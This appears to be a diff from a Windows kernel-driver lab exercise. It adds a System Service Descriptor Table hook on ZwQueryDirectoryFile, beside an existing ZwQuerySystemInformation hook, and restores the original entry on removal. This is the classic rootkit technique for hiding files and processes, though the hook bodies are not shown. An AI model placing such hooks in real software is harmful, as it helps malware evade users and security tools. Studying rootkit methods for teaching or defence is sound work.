@@ -6,6 +6,7 @@
 
 #include <ntddk.h>
 #include "process.h"
+#include "files.h"
 
 //*************************************************************
 // константы
@@ -91,6 +92,11 @@ VOID InsertAllHook(VOID) {
 
 	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG)HookZwQuerySystemInformation;
 	
+	// BASE TASK 2
+	glRealNtQueryDirectoryFile =
+		(NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]];
+
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG)HookNtQueryDirectoryFile;
 	
 	WriteCR0(reg);
 
@@ -104,6 +110,9 @@ VOID RemoveAllHook(VOID) {
 
 	// BASE TASK 0
 	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG)glRealNtQuerySystemInformation;
+
+	// BASE TASK 2
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG)glRealNtQueryDirectoryFile;
 	
 
 	WriteCR0(reg);
